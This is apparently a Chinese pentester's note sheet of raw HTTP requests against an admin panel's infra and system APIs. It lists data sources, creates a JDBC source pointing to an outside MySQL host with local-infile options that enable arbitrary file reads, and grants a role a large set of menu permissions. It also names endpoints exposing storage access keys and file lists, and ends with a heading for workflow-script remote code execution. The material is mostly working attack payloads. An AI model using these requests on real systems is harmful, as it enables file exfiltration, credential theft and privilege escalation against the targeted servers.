查看数据库连接
```
GET /admin-api/infra/data-source-config/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 47.11
Authorization: Bearer 68c0327d71ac4a06ad0a2d06d61da5b4
Origin: http://8.135
tenant-id: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Referer: http://8.135/

```
直接jdbc
```
POST /admin-api/infra/data-source-config/create HTTP/1.1
Host: 8.115:48080
tenant-id: 1
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Authorization: Bearer 500a5367c8ee447f90c3bdab633e1e2d
Pragma: no-cache
Content-Type: application/json
Accept: application/json, text/plain, */*
Origin: http://.15
Referer: http://8.15/
Content-Length: 150

{"name":"test","url":"jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","username":"test","password":"test"}
```


加权限
```
POST /admin-api/system/permission/assign-role-menu HTTP/1.1
Host: 
Content-Type: application/json
tenant-id: 1
Referer: http://1.1.1.1.6:81/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://1.1.1.6:81
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer 146d210821554b15b392d0143a9ef32b
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Content-Length: 831

{"roleId":101,"menuIds":[1224,1138,1139,1140,1141,1142,1143,1225,1226,1227,1228,1229,100,1001,1002,1003,1004,1005,1006,1007,101,1008,1009,1010,1011,1012,1063,1064,1065,102,1013,1014,1015,1016,103,1017,1018,1019,1020,104,1021,1022,1023,1024,1025,105,1026,1027,1028,1029,1030,2739,1093,1094,1095,1096,1097,1098,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,2130,2131,2132,2133,2134,2135,2136,2137,2138,2139,2140,2143,2141,2142,2144,2145,2146,2147,2148,2149,2150,2151,2152,107,1036,1037,1038,1039,108,500,1040,1042,501,1043,1045,1261,1263,1264,1265,1266,1267,109,1046,1048,2083,115,1056,1058,1057,1059,1060,1070,1255,1256,1257,1258,1259,1260,114,116,1083,1078,1088,1082,1084,1089,1085,1086,1243,1237,1238,1239,1240,1241,1242,110,1087,1050,1051,1052,1053,1054,1075,106,1031,1032,1033,1034,1035,2740,111,113,1066,1067,112,1077,1,2]}
```

^
查看


```
存储桶，存储位置，aksk
/admin-api/infra/file-config/page
文件列表
/admin-api/infra/file/page?pageNo=1&pageSize=100
```

^
工作流脚本RCE
![](.topwrite/assets/image_1747981237607.png)